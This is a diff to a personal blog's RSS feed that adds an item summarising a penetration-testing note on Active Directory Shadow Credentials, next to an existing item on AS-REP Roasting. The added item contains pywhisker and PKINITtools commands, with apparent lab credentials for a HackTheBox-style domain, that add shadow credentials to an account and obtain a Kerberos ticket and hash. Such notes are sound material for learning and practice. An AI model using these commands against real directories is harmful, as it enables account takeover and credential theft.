@@ -21,5 +21,12 @@
       <guid>https://kdbed.github.io/posts/as_rep_roasting/</guid>
       <description>AS-REP Roasting Two key attacks on Kerberos security in Active Directory include kerberoasting and AS-REP Roasting. Kerberoasting typically requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.&#xA;Use the Impacket tool GetNPUsers.py to try to get a hash for each user</description>
     </item>
+    <item>
+      <title>Pentest - Active Directory - Shadow Credentials</title>
+      <link>https://kdbed.github.io/posts/pentest_active_directory_shadow_credentials/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://kdbed.github.io/posts/pentest_active_directory_shadow_credentials/</guid>
+      <description>Shadow Credentials pywhisker&#xA;Abuse the GenericWrite ACL to get control of an account by adding shadow credentials:&#xA;1 python3 /opt/pywhisker/pywhisker.py -d &amp;#34;certified.htb&amp;#34; -u &amp;#34;judith.mader&amp;#34; -p &amp;#34;judith09&amp;#34; --target &amp;#34;management_svc&amp;#34; --action &amp;#34;add The output is a PFX cert that can be used to authenticate as the user. Get a TGT for the user with PKINITtools:&#xA;1 python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx vGRMeeb9.pfx certified.htb/management_svc -pfx-pass &amp;#39;25nQ6mg4JUTeQEjjNRE2&amp;#39; management_svc.ccache This will create a Kerberos ticket called management_svc.ccache file, which we can export and use the key this output provides in conjunction with getnthash.</description>
+    </item>
   </channel>
 </rss>
